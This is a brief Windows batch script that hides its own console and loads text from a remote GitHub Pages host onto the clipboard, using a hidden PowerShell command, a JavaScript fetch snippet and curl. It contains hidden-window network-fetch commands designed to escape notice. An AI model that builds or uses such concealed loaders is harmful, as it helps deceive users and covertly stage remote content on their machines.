@echo off
mode con: cols=5 lines=2
color 7F
timeout /t 1 /nobreak >nul
echo "powershell -windowstyle hidden scb(irm 4gu4.github.io/i)" | clip
timeout /t 1 /nobreak >nul
cls
echo "let a; fetch('https://4gu4.github.io/d/i').then(b=>b.text()).then(c=>a=c);" | clip
timeout /t 1 /nobreak >nul
cls
curl https://4gu4.github.io/d/i | clip
